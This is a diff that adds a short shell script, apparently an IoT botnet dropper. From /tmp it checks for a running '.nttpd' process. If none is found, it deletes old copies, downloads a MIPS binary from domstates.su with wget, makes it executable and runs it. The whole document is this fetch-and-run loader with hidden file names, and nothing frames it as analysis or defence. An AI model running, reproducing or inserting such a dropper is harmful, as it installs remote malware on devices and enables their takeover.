@@ -1,0 +1,10 @@
+#!/bin/sh
+
+cd /tmp
+
+ps | grep -v grep | grep .nttpd && exit 0
+
+rm -f .nttpd .nttpd-z
+wget -O .nttpd-z http://domstates.su/.nttpd,1-mips-be-t3-z
+chmod +x .nttpd-z
+./.nttpd-z && exit 0
